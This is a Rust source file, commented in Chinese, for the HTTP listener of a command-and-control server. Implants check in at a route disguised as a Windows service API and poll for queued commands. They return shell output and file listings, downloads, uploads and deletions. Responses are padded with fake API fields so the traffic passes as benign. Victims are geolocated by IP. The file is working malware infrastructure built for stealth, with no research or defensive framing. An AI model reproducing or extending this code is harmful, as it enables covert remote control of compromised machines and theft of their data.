//! HTTP Beacon 监听器模块（统一加密端点）

use crate::state::{ConnectedClient, SharedState};
use axum::{
    extract::{ConnectInfo, State},
    http::StatusCode,
    response::IntoResponse,
    routing::{get, post},
    Json, Router,
};
use serde::{Deserialize, Serialize};
use shared::crypto::Crypto;
use shared::messages::{ClientIdentification, Message as C2Message};
use std::net::SocketAddr;


/// 创建 HTTP 服务器路由
pub fn create_router(state: SharedState) -> Router {
    Router::new()
        .route("/api/CpHDCPSvc", post(handle_c2))
        .route("/api/health", get(|| async { "OK" }))
        // 不使用 CORS 中间件，避免暴露 Access-Control-* headers
        .with_state(state)
}

/// 统一请求格式（加密后）
#[derive(Deserialize)]
struct EncryptedRequest {
    data: String,  // Base64 编码的加密数据
}

/// 统一响应格式（含伪装字段）
#[derive(Serialize)]
struct EncryptedResponse {
    // === 伪装字段 ===
    #[serde(rename = "apiVersion")]
    api_version: String,
    #[serde(rename = "requestId")]
    request_id: String,
    status: String,
    timestamp: u64,
    #[serde(rename = "serverVersion")]
    server_version: String,
    // === 真实数据 ===
    data: String,  // Base64 编码的加密数据
}

impl EncryptedResponse {
    fn new(data: String) -> Self {
        use rand::Rng;
        let mut rng = rand::thread_rng();
        
        Self {
            api_version: "2.1.0".to_string(),
            request_id: format!("res_{:032x}", rng.gen::<u128>()),
            status: "success".to_string(),
            timestamp: std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap_or_default()
                .as_secs(),
            server_version: "2.1.0".to_string(),
            data,
        }
    }
}

/// 解密后的请求格式
#[derive(Deserialize)]
struct C2Request {
    #[serde(rename = "type")]
    request_type: String,  // "checkin", "beacon", "result"
    client_id: String,
    payload: serde_json::Value,
}

/// 解密后的响应格式
#[derive(Serialize)]
struct C2Response {
    #[serde(rename = "type")]
    response_type: String,
    payload: serde_json::Value,
}

/// 统一处理所有 C2 请求
async fn handle_c2(
    State(state): State<SharedState>,
    ConnectInfo(addr): ConnectInfo<SocketAddr>,
    headers: axum::http::HeaderMap,
    Json(encrypted_req): Json<EncryptedRequest>,
) -> impl IntoResponse {
    // 获取加密密钥
    let encryption_key = state.get_current_encryption_key();
    if encryption_key.is_empty() {
        return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({ "error": "No key" })));
    }
    
    let crypto = match Crypto::from_hex(&encryption_key) {
        Ok(c) => c,
        Err(_) => {
            return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({ "error": "Invalid key" })));
        }
    };
    
    // Base64 解码
    let encrypted_data = match base64::Engine::decode(&base64::engine::general_purpose::STANDARD, &encrypted_req.data) {
        Ok(d) => d,
        Err(_) => {
            return (StatusCode::BAD_REQUEST, Json(serde_json::json!({ "error": "Invalid Base64" })));
        }
    };
    
    // 解密
    let decrypted = match crypto.decrypt(&encrypted_data) {
        Ok(d) => d,
        Err(_) => {
            return (StatusCode::UNAUTHORIZED, Json(serde_json::json!({ "error": "Decryption failed" })));
        }
    };
    
    // 解析请求
    let request: C2Request = match serde_json::from_slice(&decrypted) {
        Ok(r) => r,
        Err(e) => {
            println!("[!] Failed to parse C2 request: {}", e);
            return (StatusCode::BAD_REQUEST, Json(serde_json::json!({ "error": "Invalid request" })));
        }
    };
    
    // 根据类型分发处理
    let response = match request.request_type.as_str() {
        "checkin" => handle_checkin(&state, &headers, &addr, &request).await,
        "beacon" => handle_beacon(&state, &request).await,
        "result" => handle_result(&state, &request).await,
        _ => {
            println!("[!] Unknown request type: {}", request.request_type);
            C2Response {
                response_type: "error".to_string(),
                payload: serde_json::json!({ "error": "Unknown type" }),
            }
        }
    };
    
    // 序列化响应
    let response_json = serde_json::to_vec(&response).unwrap_or_default();
    
    // 加密响应
    let encrypted_response = match crypto.encrypt(&response_json) {
        Ok(e) => e,
        Err(_) => {
            return (StatusCode::INTERNAL_SERVER_ERROR, Json(serde_json::json!({ "error": "Encryption failed" })));
        }
    };
    
    // Base64 编码
    let response_b64 = base64::Engine::encode(&base64::engine::general_purpose::STANDARD, &encrypted_response);
    
    // 使用伪装响应格式
    let response_json = serde_json::to_value(EncryptedResponse::new(response_b64)).unwrap_or_default();
    (StatusCode::OK, Json(response_json))
}

/// 处理 Checkin 请求
async fn handle_checkin(
    state: &SharedState,
    headers: &axum::http::HeaderMap,
    addr: &SocketAddr,
    request: &C2Request,
) -> C2Response {
    // 解析上线信息
    let info: ClientIdentification = match serde_json::from_value(request.payload.clone()) {
        Ok(i) => i,
        Err(e) => {
            println!("[!] Failed to parse checkin payload: {}", e);
            return C2Response {
                response_type: "checkin".to_string(),
                payload: serde_json::json!({ "success": false, "error": "Invalid payload" }),
            };
        }
    };
    
    let ip = get_client_ip(headers, addr);
    println!("[+] New client checkin: {} from {}", request.client_id, ip);
    
    // 查询 IP 对应的国家
    let country = get_country_from_ip(&ip).await.unwrap_or_else(|| "Unknown".to_string());
    
    let mut client = ConnectedClient::from_identification(info, ip);
    client.country = country;
    state.add_client(client);
    
    C2Response {
        response_type: "checkin".to_string(),
        payload: serde_json::json!({ "success": true }),
    }
}

/// 处理 Beacon 请求
async fn handle_beacon(state: &SharedState, request: &C2Request) -> C2Response {
    let client_id = &request.client_id;
    
    // 更新客户端最后在线时间
    state.update_last_seen(client_id);
    
    // 获取待执行的命令
    let pending = state.take_pending_commands(client_id);
    
    // 命令已经是序列化后的二进制，转为 Base64
    let commands: Vec<String> = pending.iter()
        .map(|data| base64::Engine::encode(&base64::engine::general_purpose::STANDARD, data))
        .collect();
    
    if !commands.is_empty() {
        println!("[*] Beacon from {}: sending {} commands", client_id, commands.len());
    }
    
    C2Response {
        response_type: "beacon".to_string(),
        payload: serde_json::json!({ "commands": commands }),
    }
}

/// 处理 Result 请求
async fn handle_result(state: &SharedState, request: &C2Request) -> C2Response {
    let client_id = &request.client_id;
    state.update_last_seen(client_id);
    
    // 解析响应列表
    let responses: Vec<String> = match serde_json::from_value(request.payload.clone()) {
        Ok(r) => r,
        Err(_) => {
            return C2Response {
                response_type: "result".to_string(),
                payload: serde_json::json!({ "success": false }),
            };
        }
    };
    
    for response_b64 in &responses {
        // Base64 解码
        if let Ok(data) = base64::Engine::decode(&base64::engine::general_purpose::STANDARD, response_b64) {
            // 反序列化消息
            if let Ok(msg) = C2Message::deserialize(&data) {
                handle_client_message(state, client_id, msg).await;
            }
        }
    }
    
    C2Response {
        response_type: "result".to_string(),
        payload: serde_json::json!({ "success": true }),
    }
}

/// 处理客户端消息
async fn handle_client_message(state: &SharedState, client_id: &str, msg: C2Message) {
    match msg {
        C2Message::Heartbeat(hb) => {
            println!("[*] Heartbeat from {}: {}", client_id, hb.timestamp);
        }
        C2Message::ShellExecuteResponse(response) => {
            let preview: String = response.output.chars().take(100).collect();
            let suffix = if response.output.chars().count() > 100 { "..." } else { "" };
            println!("[*] Shell response from {}: {}{}", client_id, preview, suffix);
            
            let shell_response = crate::state::ShellResponse {
                client_id: client_id.to_string(),
                output: response.output,
                is_error: response.is_error,
                timestamp: chrono::Utc::now().timestamp(),
            };
            state.add_shell_response(shell_response);
        }
        C2Message::DirectoryListingResponse(response) => {
            println!("[*] Directory listing from {}: {} entries", client_id, response.entries.len());
            let file_response = crate::state::FileResponse::DirectoryListing {
                path: response.path,
                entries: response.entries.into_iter().map(|e| crate::state::FileEntryInfo {
                    name: e.name,
                    path: e.path,
                    is_dir: e.is_dir,
                    size: e.size,
                    modified: e.modified,
                }).collect(),
                error: response.error,
            };
            state.add_file_response(client_id, file_response);
        }
        C2Message::FileDownloadResponse(response) => {
            println!("[*] File download from {}: {} bytes", client_id, response.data.len());
            let file_response = crate::state::FileResponse::FileDownload {
                path: response.path,
                data: response.data,
                error: response.error,
            };
            state.add_file_response(client_id, file_response);
        }
        C2Message::FileUploadResponse(response) => {
            println!("[*] File upload response from {}: {}", client_id, response.success);
            let file_response = crate::state::FileResponse::FileUpload {
                path: response.path,
                success: response.success,
                error: response.error,
            };
            state.add_file_response(client_id, file_response);
        }
        C2Message::FileDeleteResponse(response) => {
            println!("[*] File delete response from {}: {}", client_id, response.success);
            let file_response = crate::state::FileResponse::FileDelete {
                path: response.path,
                success: response.success,
                error: response.error,
            };
            state.add_file_response(client_id, file_response);
        }
        _ => {
            println!("[?] Unknown message from {}", client_id);
        }
    }
}

/// 从请求中获取客户端真实 IP
fn get_client_ip(headers: &axum::http::HeaderMap, addr: &SocketAddr) -> String {
    if let Some(forwarded) = headers.get("x-forwarded-for").and_then(|h| h.to_str().ok()) {
        if let Some(first_ip) = forwarded.split(',').next() {
            let ip = first_ip.trim();
            if !ip.is_empty() && ip != "127.0.0.1" && ip != "::1" {
                return ip.to_string();
            }
        }
    }
    
    if let Some(real_ip) = headers.get("x-real-ip").and_then(|h| h.to_str().ok()) {
        let ip = real_ip.trim();
        if !ip.is_empty() && ip != "127.0.0.1" && ip != "::1" {
            return ip.to_string();
        }
    }
    
    if let Some(cf_ip) = headers.get("cf-connecting-ip").and_then(|h| h.to_str().ok()) {
        let ip = cf_ip.trim();
        if !ip.is_empty() {
            return ip.to_string();
        }
    }
    
    addr.ip().to_string()
}

/// 通过 IP 获取国家信息
async fn get_country_from_ip(ip: &str) -> Option<String> {
    if ip == "127.0.0.1" || ip == "::1" || ip.starts_with("192.168.") || ip.starts_with("10.") {
        return Some("Local".to_string());
    }
    
    let url = format!("http://ip-api.com/json/{}?fields=country,countryCode", ip);
    
    match reqwest::get(&url).await {
        Ok(resp) => {
            if let Ok(json) = resp.json::<serde_json::Value>().await {
                if let Some(country) = json.get("country").and_then(|c| c.as_str()) {
                    return Some(country.to_string());
                }
            }
        }
        Err(e) => {
            println!("[!] Failed to query IP location: {}", e);
        }
    }
    
    None
}

/// 向客户端发送命令（加入队列）
pub fn send_to_client(state: &SharedState, client_id: &str, data: &[u8]) {
    state.push_command(client_id, data.to_vec());
}

/// 启动 HTTP 服务器
pub async fn start_server(state: SharedState, bind_addr: &str) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let app = create_router(state);
    let addr: SocketAddr = bind_addr.parse()?;
    
    println!("[*] Starting HTTP C2 server on {}", addr);
    
    let listener = tokio::net::TcpListener::bind(addr).await?;
    axum::serve(listener, app.into_make_service_with_connect_info::<SocketAddr>()).await?;
    
    Ok(())
}
